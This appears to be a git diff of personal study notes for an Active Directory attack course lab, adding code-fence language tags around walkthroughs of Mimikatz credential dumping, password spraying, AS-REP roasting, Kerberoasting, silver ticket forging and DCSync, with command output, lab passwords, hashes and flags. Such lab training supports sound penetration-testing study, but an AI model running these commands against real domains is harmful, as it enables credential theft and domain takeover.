@@ -179,7 +179,7 @@ As an example, we will use Mimikatz to extract domain hashes on our Win 11 sys.
 Since `jeff` domain user is local admin on CLIENT75, we can launch a PowerShell with elevated privs. Let's try to connect to this machine as `jeff` with password `HenchmanPutridBonbon11` via RDP.
 
 Once connected, start a PS session as Admin.  We can start Mimikatz from this command prompt and enter `privilege::debug` to engage the `SeDebugPrivilege` priv, which allows us to interact with a proc owned by another account.
-```
+```powershell
 PS C:\Windows\system32> cd C:\Tools\
 PS C:\Tools> .\mimikatz.exe
 
@@ -196,7 +196,7 @@ Privilege '20' OK
 Next we run `sekurlsa::logonpasswords` to dump the creds of all logged-on users with the [Sekurlsa](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) module.
 
 This will dump the hashes of all logged on users of the current workstation/server, including remote logins like RDP sessions.
-```
+```bash
 mimikatz # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 3726316 (00000000:0038dbec)
@@ -319,7 +319,7 @@ We can attempt to crack the hashes to obtain cleartext passwords.
 Another approach is to use Mimikatz to exploit Kerberos auth by abusing TGT and service tickets.  We know that Kerberos TGT and service tickets for users logged on to the local machine are stored for future use, they are also stored in the LSASS, and we can use Mimikatz to retrieve our own tickets as well as those of other local users.
 
 Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path `\\web04.corp.com\backup`, which will create a cached service ticket.  Once we've executed the directory list on the share we can use Mimikatz to show the tickets that are stored in memory by entering `sekurlsa::tickets`.
-```
+```bash
 mimikatz # sekurlsa::tickets
 
 Authentication Id : 0 ; 4188466 (00000000:003fe932)
@@ -421,7 +421,7 @@ Previously we examined several password attacks on network services and hashed i
 Before going into detail, we must account for one important factor.  When running brute force or wordlist attacks, we must be aware of account lockouts.  A number of failed logins may result in the account being blocked and possibly alert the SA.
 
 To learn more about lockouts, review the domain account policy as domain user `jeff` on CLIENT75.  We can connect to the sys with password `HenchmanPutridBonbon11` via RDP, open PowerShell, and exec `net accounts` to obtain the account policy.
-```
+```powershell
 PS C:\Users\jeff> net accounts
 Force user logoff how long after time expires?:       Never
 Minimum password age (days):                          1
@@ -449,7 +449,7 @@ This would also generate a huge amount of network traffic.  Let's review 3 kinds
 The first uses LDAP and ADSI to perform a "low and slow" password spray attack against AD users.  We previously performed queries against the DC as a logged-in user with [DirectoryEntry](https://docs.microsoft.com/de-de/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0), but we can also make queries in the context of a different user by setting the DirectoryEntry instance.
 
 In the AD Introduction and Enumeration module we used `DirectoryEntry` constructor without args, but we can provide 3, including the LDAP path to the DC, the username, and the password.
-```
+```powershell
 PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
 distinguishedName : {DC=corp,DC=com}
@@ -458,7 +458,7 @@ Path              : LDAP://DC1.corp.com/DC=corp,DC=com
 - As shown above, if the password of the user account is correct the object creation will be successful.
 
 If the password of the user account is invalid, no object will be created and we will receive an exception.  Let's change the password to `WrongPassword`, we will notice a warning that username/password is incorrect.
-```
+```powershell
 PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "WrongPassword")
 format-default : The following exception occurred while retrieving member "distinguishedName":
 "The user name or password is incorrect.
@@ -473,7 +473,7 @@ We can use this technique to create a PowerShell script that enums all users and
 This password spray tactic is implemented in the PS script `C:\Tools\Spray-Passwords.ps1` on CLIENT75.
 
 The `-Pass` option allows us to set a single password to test or we can submit a word list with the `-File` option.  We can test admin accounts with the `-Admin` flag.  The PS script automatically identifies domain users and sprays passwords against them.
-```
+```powershell
 PS C:\Users\jeff> cd C:\Tools\
 PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
 WARNING: also targeting admin accounts.
@@ -493,7 +493,7 @@ We can use `crackmapexec` on Kali to perform this kind of password spray.  We se
 - `jen`
 - `pete`
 Then spray password `Nexus123!` against them.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ for u in dave jen pete; echo $u >> users.txt
                                                                                          
@@ -527,7 +527,7 @@ SMB         192.168.242.75  445    CLIENT75         [+] corp.com\pete:Nexus123!
 - NOTE: crackmapexec doesn't examine the password policy of the domain before starting, therefore we should be cautious about locking out user accounts with this method.
 
 As a bonus, the output also shows if the user with identified creds has admin privs on the target sys.  Example, `dave` is local admin on CLIENT75, use crackmapexec with the password `Flowers1` targeting this sys.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ crackmapexec smb 192.168.242.75 -u dave -p 'Flowers1' -d corp.com                   
 SMB         192.168.242.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
@@ -542,7 +542,7 @@ The third password spray attack is based on obtaining a TGT.  Example, using [ki
 We could use Bash scripting or a programing language of our choice to automate this method, or we can use the tool [kerbrute](https://github.com/ropnop/kerbrute) which implements this technique to spray passwords.  This tool is cross platform and can be used on both Linux and Windows.
 
 Let's use the Win version in `C:\Tools` to perform this attack.  To conduct the attack we need to specify the `passwordspray` command along with a list of usernames and the password to spray.  We'll also need to enter the domain `corp.com` as arg for `-d`.  Create a file `usernames.txt` in `C:\Tools` containing user names `pete`, `dave`, `jen`.
-```
+```powershell
 PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 
     __             __               __
@@ -566,7 +566,7 @@ For crackmap and kerbrute, we had to provide a list of usernames.  To obtain a l
 ###### Labs
 
 Spray the credentials of pete against all domain joined machines with crackmapexec. On which machine is pete a local administrator?
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ for i in {70..76}; crackmapexec smb 192.168.242.$i -u pete -p 'Nexus123!' -d corp.com
 SMB         192.168.242.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
@@ -595,7 +595,7 @@ By default, the AD user account option *Do not require Kerberos preauthenticatio
 Let's perform this attack from our Kali machine first, then from Win.  On Kali, we can utilize [impacket-GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) to perform AS-REP roasting.  We'll need to enter the IP address of the DC for arg `-dc-ip`, the name of the output file in which the AS-REP hash will be stored in the Hashcat format for `-outputfile`, and `-request` to request the TGT.
 
 Then we need to specify the target auth info in the format `domain/user`.  This is the user we use for authentication.  For example, we'll use `pete` with password `Nexus123!` from the prior section.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ impacket-GetNPUsers -dc-ip 192.168.242.70  -request -outputfile hashes.asreproast corp.com/pete     
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -613,7 +613,7 @@ $krb5asrep$23$dave@CORP.COM:84034d5b9fde766369bd77ebad4da7c3$55b32180de371d7a182
  - It is vulnerable to AS-REP Roasting.
 
 The default hash format of `impacket-GetNPUsers` is compatible with Hashcat, so we must check the mode for AS-REP hash by grepping for "Kerberos" in the Hashcat help.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ hashcat --help | grep -i "Kerberos"                           
   19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
@@ -634,7 +634,7 @@ We now have what we need to launch Hashcat and crack the AS-REP hash.  Run Hashc
 - Wordlist `rockyou.txt`
 - Rule file `best64.rule`
 - `--force`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 [sudo] password for operator: 
@@ -670,7 +670,7 @@ Stopped: Sat Dec 16 11:22:27 2023
 We can also perform AS-REP Roasting on Windows.  We'll use [Rubeus](https://github.com/GhostPack/Rubeus), a toolset for raw Kerberos interactions and abuses.  To perform the attack we connect to CLIENT75 via RDP as domain user `jeff` with password `HenchmanPutridBonbon11`.
 
 Since we are performing the attack as a preauthenticated domain user, we need no other options except `asreproast`.  Rubeus will auto ID vulnerable user accounts.  Add the flag `/nowrap` to prevent new lines being added to the resulting AS-REP hashes.
-```
+```powershell
 PS C:\Tools> .\Rubeus.exe asreproast /nowrap
 
    ______        _
@@ -700,7 +700,7 @@ PS C:\Tools> .\Rubeus.exe asreproast /nowrap
 - Rubeus identified `dave` as vulnerable to AS-REP Roasting and displays the AS-REP hash.
 
 We can copy the hash and paste it into a text file `hashes.asreproast2` in the working dir of `kali` and run Hashcat again.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ sudo hashcat -m 18200 hashes.asreproast2 
 ...
@@ -858,7 +858,7 @@ The service ticket is encrypted with the SPN's password hash, if we are able to 
 As an example we will abuse a service ticket and attempt to crack the service account password.  Start by connecting to CLIENT75 via RDP as `jeff`.
 
 We will use Rubeus again, specifying the `kerberoast` command, providing `hashes.kerberoast` as the `/outfile` arg to store the TGS-REP hash in.  Sine we exec Rubeus as an authenticated domain user, the tool will ID all SPNs linked with a domain user.
-```
+```powershell
 PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 
    ______        _
@@ -896,7 +896,7 @@ $krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$454C023FE349C
 - We find one user account vulnerable to Kerberoasting.
 
 Copy the hash to our Kali system and search Hashcat help for the correct mode to crack TGS-REP hashes.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ hashcat --help | grep -i "Kerberos"
 ...
@@ -906,7 +906,7 @@ Copy the hash to our Kali system and search Hashcat help for the correct mode to
 - The correct mode for TGS-REP is `13100`
 
 We'll start Hashcat with similar args.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ sudo hashcat -m 13100 hashes.kerberoast 
 ...
@@ -938,7 +938,7 @@ Stopped: Sat Dec 16 13:27:51 2023
 - We recovered the plaintext password of `iss_service` user via Kerberoasting.
 
 Next we will perform Kerberoasting from Linux, we will use [impacket-GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) with the IP of the DC as arg `-dc-ip`.  Our Kali machine is not a domain joined system, so we have to provide domain user credentials to obtain the TGS-REP hash.  We use `-request` to obtain the TGS and output it into Hashcat compatible format.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.242.70 corp.com/pete
 [sudo] password for operator: 
@@ -959,7 +959,7 @@ $krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$358b7ebde50f473c1e2dcedc
 *If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate3 or rdate4 to do so.*
 
 Now we can store the TGS-REP has in a file and crack it with Hashcat, as we did before.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ sudo hashcat -m 13100 hashes.kerberoast2 
 ...
@@ -1004,7 +1004,7 @@ Let's assume that during an assesment we notice that we have `GenericWrite` or `
 ###### Labs
 
 Once VM Group 2 is started, the domain corp.com has been slightly modified. Use the techniques from this section to obtain another plaintext password by performing Kerberoasting and enter it as answer to this exercise. To crack the TGS-REP hash, create and utilize a rule file which adds a "1" to the passwords of rockyou.txt. To perform the attack, you can use the user jeff with the password HenchmanPutridBonbon11.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ sudo hashcat -m 13100 hashes.pete /usr/share/wordlists/rockyou.txt -r addone.rule --force 
 [sudo] password for operator: 
@@ -1113,7 +1113,7 @@ We would need to collect the following 3 pieces of info to create a silver ticke
 Connect to CLIENT75 via RDP with user `jeff` to start the attack.
 
 Let's confirm that our user has no access to the resource of the HTTP SPN mapped to `iis_service`.  User `iwr` and enter `-UseDefaultCredentials` so the current user creds used to send the req.
-```
+```powershell
 PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
 iwr : Server Error
 401 - Unauthorized: Access is denied due to invalid credentials.
@@ -1132,7 +1132,7 @@ At line:1 char:1
 Since we are local admin on a machine where `iis_service` has established a session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service), the first piece of info we need.
 
 Start PowerShell as admin and launch Mimikatz, we will use `privilege::debug` and `sekurlsa::logonpasswords` to extract the cached AD creds.
-```
+```powershell
 PS C:\Tools> .\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
@@ -1182,7 +1182,7 @@ SID               : S-1-5-21-1987370270-658905905-1781884369-1109
 Next we need to obtain the SID, enter `whoami /user` to get the SID of the current user, alternately we could retrieve it from the Mimikatz output as the domain user exists in the same domain.
 
 As we covered in Windows Privilege Escalation, the SID is multi-part and we are only interested in the Domain SID so we will omit the RID of the user.
-```
+```powershell
 PS C:\Users\jeff> whoami /user
 
 USER INFORMATION
@@ -1206,7 +1206,7 @@ We can now build the command to create a silver ticket with Mimikatz using the `
 We must provide the domain SID `/SID:`, domain name `/domain:`, and the target where the SPN runs `/target:`.  We also need to include the SPN proto `/service:`, NTLM hash of the SPN `/rc4:`, and the `/ptt` option to inject the forged ticket into the memory of the machine we exec the command on.
 
 Finally we need to enter an existing domain user `/user:` to be set in the forged ticket, `jeffadmin` in this case, but we could use any domain user since we can set the perms and groups ourselves.
-```
+```bash
 mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
 User      : jeffadmin
 Domain    : corp.com (CORP)
@@ -1233,7 +1233,7 @@ Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current sess
 To the IIS app, the current user with be both built-in local admin (RID: 500) and a member of several high-priv groups, including domain admins group (RID: 512).
 
 We should have a ticket ready to use in memory, we can confirm with `klist`.
-```
+```powershell
 PS C:\Tools> klist
 
 Current LogonId is 0:0x347d2e
@@ -1254,7 +1254,7 @@ Cached Tickets: (1)
 - We have a silver ticket for `jeffadmin` to access `http/web04.corp.com` submitted to our current session, allowing us to access the web page on WEB04 as `jeffadmin`.
 
 Verify with `iwr`.
-```
+```powershell
 PS C:\Tools> iwr -UseDefaultCredentials http://web04
 
 
@@ -1296,7 +1296,7 @@ Since the silver and golden tickets are a powerful attack technique, MS created 
 ###### Labs
 
 Follow the steps outlined in this section to forge a silver ticket for jeffadmin in order to access the web page located at http://web04. Review the source code of the page and find the flag.
-```
+```powershell
 PS C:\Tools> (iwr -UseDefaultCredentials http://web04).Content | findstr.exe /i "OS{"
 <!-- OS{cd576ae061fdfe6dc94e8d62837181ea} -->
 ```
@@ -1321,7 +1321,7 @@ To perform this attack, we use Mimikatz on a domain joined machine or [impacket-
 We'll start with Mimikatz and connect to CLIENT75 as `jeffadmin` with the password `BrouhahaTungPerorateBroom2023!`, as a member of the Domain Admins group we already have to required rights.
 
 To perform the attack with Mimikatz, we use `lsadump:dcsync` module and provide the domain username for which we want to obtain creds as the `/user:` arg.
-```
+```powershell
 PS C:\Tools> .\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
@@ -1421,7 +1421,7 @@ Copy the NTLM hash into a file names `hashes.dcsync` on our Kali sys, we can cra
 - Wordlist `rockyou.txt`
 - Rule file `best64.rule`
 - Path to hash file and `--force`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ...
@@ -1433,7 +1433,7 @@ Copy the NTLM hash into a file names `hashes.dcsync` on our Kali sys, we can cra
 We can now retrieve the NTLM hash of any domain user account on the corp.com domain, we can then attempt to crack the hashes and retrieve plaintext passwords of the accounts.
 
 We can perform the desync attack to obtain any user password hash in the domain, event the domain admin.
-```
+```bash
 mimikatz # lsadump::dcsync /user:corp\dave
 [DC] 'corp.com' will be the domain
 [DC] 'DC1.corp.com' will be the DC server
@@ -1462,7 +1462,7 @@ Credentials:
 In upcoming module Lateral Movement in Active Directory we will discuss lateral movement vectors leveraging NTLM hashes obtained by dcsync.
 
 Next, let's perform a dcsync attack from Kali, using `imapcket-secretsdump`.  Enter target username `dave` as an arg for `-just-dc-user` and provide the creds of a user with required rights, along with a DC IP in the format `domain/user:password@ip`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.199.70
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -1488,7 +1488,7 @@ it is possible to leverage a user with proper rights, but it is unlikely that we
 ###### Labs
 
 Follow the steps outlined in this section to perform the dcsync attack to obtain the NTLM hash of the krbtgt account. Enter the NTLM hash as answer to this question.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.199.70
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -1508,7 +1508,7 @@ krbtgt:des-cbc-md5:683bdcba9e7c5de9
 ###### Labs
 
 Capstone Exercise: Once VM Group 2 is started, the domain corp.com has been modified. Use the techniques from this Module to obtain access to the user account maria and log in to the domain controller. To perform the initial enumeration steps you can use pete with the password Nexus123!. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of rockyou.txt.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ crackmapexec smb 192.168.199.72 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --shares --sessions 
 SMB         192.168.199.72  445    WEB04            [*] Windows 10.0 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
@@ -2331,7 +2331,7 @@ OS{afce2a09f525f9486c35b54cb34c8547}
 
 
 Capstone Exercise: Once VM Group 3 is started, the domain corp.com has been modified. By examining leaked password database sites, you discovered that the password VimForPowerShell123! was previously used by a domain user. Spray this password against the domain users meg and backupuser. Once you have identified a valid set of credentials, use the techniques from this Module to obtain access to the domain controller. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, reuse the rule file from the previous exercise.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ for i in 72 73 74 75 70; crackmapexec smb 192.168.199.$i -u csuser.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success --shares --sessions 
 SMB         192.168.199.72  445    WEB04            [*] Windows 10.0 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
